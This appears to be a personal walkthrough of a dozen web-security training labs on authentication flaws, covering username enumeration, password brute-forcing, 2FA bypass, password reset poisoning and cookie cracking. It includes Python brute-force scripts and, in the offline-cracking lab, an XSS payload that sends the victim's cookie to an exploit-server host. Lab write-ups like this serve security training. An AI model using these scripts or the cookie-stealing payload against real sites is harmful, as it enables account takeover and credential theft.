							
								AUTH-LAB01:
						Username enumeration via different responses
4E?}S9L'Cq*qq_3+LcD26[}?9==W8:yj

								
 This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

    Candidate usernames
    Candidate passwords

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

Solution:-

1) First we need to connect the site with proxy server uisng burpsuite and foxyproxy.
2) Then we have to go to My account and enter random username and password and send the query to intruder.
3) In intruder select random username you entered and $Add it after that copy all the usernames given in the exercise and paste it and start the normal attack.
4) Onc ewe find the different length for the username that is the username.
5) After that we need to enter username as same we found and then add random password to $Add and do the same.
6) Once we receive 302 error code we have retreived the password and now we can login using username and password.

**********************************************************


								AUTH-LAB02:
							     2FA simple bypass

 This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

    Your credentials: wiener:peter
    Victim's credentials carlos:montoya
    
 Solution: 
 
 1) First we need to access the site through burpsuite and foxyproxy.
 2) Then we need to sign in into my account using given username and password.
 3) Then again we need to connect to the interceptor and try login using given username and password.
 4) In URL we need to type my-account in place of login2 and drop the request from inceptor and turn off the interceptor.
 5) We have succesfully completed the Lab.
 
 *********************************************************

								AUTH-LAB03:
						   Password reset broken logic

 This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

    Your credentials: wiener:peter
    Victim's username: carlos

Solution: 

1) First we need to access the site through burpsuite and foxyproxy.
2) then we need togo to my account --> forgot password , then send this request to repeater.
3) Then enter the new password in the site and again send the request to repeater.
4) change the token_id as x because they both are same so we can try changing the token_id and enter the name to the username we want to hack the password.
5) In burpsuite we need to send the request using repeater and the forward the query and use my account section to login using given user.

******************************************************


								AUTH -LAB04:
						Username enumeration via subtly different responses
						
 This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

    Candidate usernames
    Candidate passwords

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

Solution:

1) First we need to access the site through burpsuite and foxyproxy.
2) In my account section try using random username and password and sent the request to repeater and then to intruder.
3) In intruder $Add to the username and copy all the usernames provided in the exercise.
4) It is hard to find the error, SO here the error was differentiate with one fullstop.
5) Error --> invalid username and password and for others --> invalid username and password.
6) after finidng username $Add password and copy all passwords provided to intruder and then login to my account.

*******************************************************



								AUTH -LAB05:
						Username enumeration via response timing
					
 This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

    Your credentials: wiener:peter
    Candidate usernames
    Candidate passwords

Solution:
1) First we need to access the site through burpsuite and foxyproxy.
2) In my account section try using random username and long password as long password will take long time to execute and use known user as I used now wiener which is available in database and sent the request to repeater and then to intruder.
3) Add one command in the repeater query i.e. X-Forwarded-For: 888(This can be any random number you want but choose larger number to avoid collision).
4) In intruder $Add to the username and copy all the usernames provided in the exercise and also $Add to X-Forwarded number and choose attack as PITCHFORK.
5) In Payload1 : Numbers, From: 105 To: 205, Step: 1. Payload2: Simple List and pass the usernames that are provided and then start attack.
6) We will find valid user whose response time should be greater than everyone.
7) For the password same procedure as above just clear usernames and add passwords.
8) While login into my-account again connect proxy and add X-forwarded and username password and use forward button to solve the Lab.

*********************************************************


								AUTH -LAB06:
						Broken brute-force protection, IP block
						
 This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

    Your credentials: wiener:peter
    Victim's username: carlos
    Candidate passwords

Solution:

1) First we need to access the site through burpsuite and foxyproxy.
2) In my account section try using random username and password and sent the request to repeater and then to intruder.

For this solution we need to script some part in PYTHON because it will take a lot time if we try same thing with INTRUDER, because after 2 failed login attempts we get timeout for 1 minute. 
For this the solution is to login using real id and pass for the third time which will save time also and will receive no errors.

PYTHON SCRIPT:
print('Following are the usernames:')

for i in range(150):
    if i % 3:
        print('carlos')
    else:
        print('wiener')


print('Following are the passwords:')

with open('password.txt', 'r') as f:
    lines = f.readlines()

i = 0

for pwd in lines:
    if i % 3:
        print(pwd.strip('\n'))
    else:
        print('peter')
        print(pwd.strip('\n'))
        i = i + 1
    i = i + 1
    
3) After running this script we will receive the 150 usernames and 150 passwords we need to copy them and paste them in the intruder and select type as PITCHFORK.
4) For range we are taking 150 because 100 are test case and 50 are the real id and pass.
5) We will receieve 302 error for carlos so try login using id and pass and lab should be solved.


									AUTH -LAB08:
								      2FA broken logic
								      
 This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

    Your credentials: wiener:peter
    Victim's username: carlos

You also have access to the email server to receive your 2FA verification code. 

Solution:

1) First we need to login using wiener and peter userid and password and click on email client to have access to the 2FA code and than enter the code in the 2FA.
2) We need to send 3 requests to the repeater 2 POST and 1 GET request.
3) First request is of POST/login, next GET/login2, and POST/login2.
4) First request is when we enter correct userid and password, next is of when we get the request for the 2FA, and next is of 2FA code.
5) we find no vulnerability in the first request, in second request we have 2 vulnerability it takes verify name where we can put target name carlos without getting any error and we can remove session cookie this is second vulnerability, in third request we can change the verify name and get no error.
6) We need to send third request to the intruder, clear all and than $Add to the 2FA four digit number, keep attack as sniper and payload as bruteforce and remove alphabets and keep 0-9 numbers. thier should be 10000 count and start attack.
7) Where we get different response then 200 is the 2FA code for carlos.

***********************************************

									
									AUTH -LAB09:
								Brute-forcing a stay-logged-in cookie
								
 This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

    Your credentials: wiener:peter
    Victim's username: carlos
    Candidate passwords

Solution:

1) First we need to connect to the foxyproxy and connect to the firefox and burpsuite.
2) we need to login using the given username and password and click the option stay-logged in option.
3) For stay-logged in function a new cookie key is generated which is in hash MD5 format and after decoding it is in the username and password format i.e. wiener:peter
4) Then we need to send the my-account/GET request to the intruder and $Add the cookie of stay-logged in.
5) Use the SNIPER attack and for payload use simple list and paste the given passwords.
6) In the payload processing a) add hash:md5 b)add prefix:carlos: c)encode: base-64 encode and start the attack.
7) we will find the different 200 status and that is the output, but for me I was not receiving 200, so I used the pythin script.

PYTHON SCRIPT: 

import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def access_carlos_account(url):

    print("(+) Brute-forcing Carlos's password...")
    with open('password.txt', 'r') as file:
        for pwd in file:
            hashed_pwd = 'carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode('utf-8')).hexdigest()
            encoded_pwd = base64.b64encode(bytes(hashed_pwd, 'utf-8'))
            str_pwd = encoded_pwd.decode('utf-8')

            r = requests.Session()
            myaccount_url = url + '/my-account'
            cookies = {'stay-logged-in': str_pwd}
            req = r.get(myaccount_url, cookies=cookies, verify = False, proxies=proxies)
            if 'log out' in req.text:
                print('(+) Carlos password is' + pwd)
                sys.exit(-1)
        print('(-) could not find carlos password.')

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    access_carlos_account(url)


if __name__ == '__main__':
    main()
    

In the terminal write python3 filename and copy site url and remove / from the end and run.


**********************************************************

									AUTH -LAB010:
								  Offline password cracking
								  
 This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

    Your credentials: wiener:peter
    Victim's username: carlos

Solution:

1) First we need to login using given username and password and inspect the query in the burpsuite.
2) We can find that it doesn't have any http only flag so we can breach it using the javascript.
3) now we need to find where we can update anything in the site and their is one post function where we can post the javascript query.
4) To test we can post one query <script>alert(1)</script>.
5) Now the above query executes now we can do javascript hack.
6) Query: <script>document.location='https://exploit-0a2b00bf0427f98580877a39016b006b.exploit-server.net/exploit'+document.cookie</script>.
7) above query is used to get the logged-in cookie for the user.
8) Go to the exploit tab at the top of the site and go to the access log session to get access to the "GET /exploitsecret message and try this in decoder and crackstation.
9) Then delete the user and the lab is solved.

*********************************************************
									
									AUTH -LAB011:
							   Password reset poisoning via middleware

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server. 

Solution:

1) First we need to go to the my-account section and click on forgot password to see what is the vulnerability and enter given account name wiener.
2) Send this request to repeater and then open exploit and go to email-client and send the request to repeater.
3) Reset the password and send the request to repeater.
4) First request is post fogot password, Second is get forgot password, Third is post forgot password which we change the password.
5) Now we need to try the vulnerabilities, in first request we need to find that it is vulnerable to header or not by using X-Forwaded-Host: (exploit server link without http and till net) and hit send and then check the email client and see if we got mail from exploit server and change the name to carlos in the request.
6) Then go to exploit server access log and look to carlos entry with different ip address and copy the password token and copy it and paste it into temp forgot password cookie in second request.
7) In third request paste the cookie in the both cookie link and change the password in the passowrd field at the bottom and hit send and follow redirection and try login using new password.
								
*******************************************************

									AUTH -LAB012:
								Password brute-force via password change
								
 This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

    Your credentials: wiener:peter
    Victim's username: carlos
    Candidate passwords


Solution:

1) First login using the given username and password and then try to find the vulnerablity in the password change section.
2) Here we find the vulnerability is that when we enter the new password and enter retype new password different and when the original passowrd is correct we get --> new passwords do not match and when password is incorrect we get passowrd is incorrect message.
3) So we need to change the last request when we enter wrong password to repeater and then to the intruder and change username to carlos and add the password given as simple list.
4) In the intruder result when we get different length we get correct password try login with that username and password.

******************************************************

								
									AUTH -LAB013:
						    Broken brute-force protection, multiple credentials per request
						    
 This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

    Victim's username: carlos
    Candidate passwords

Solution:

1) First we need to login using carlos username and random password and send the request to the repeater.
2) So the request is in JSON format which takes the input in set format.
3) So it takes more than one passwords at a time, we need to write python script for all passwords to be in the line.

PYTHON SCRIPT:

print("[", end = '')

with open('password.txt', 'r') as f:
    lines = f.readlines()

for pwd in lines:
    print('"' + pwd.rstrip("\n") + '",', end = '')

print('"random"]', end = '')

4) Copy all passwords from vscode terminal and paste them in the burpsuite repeater.
5) send the request using repeater and then follow redirection.
6) copy the session-id and open browser inspect it, go to storage or application and paste the session id in cookie section and the lab is solved.



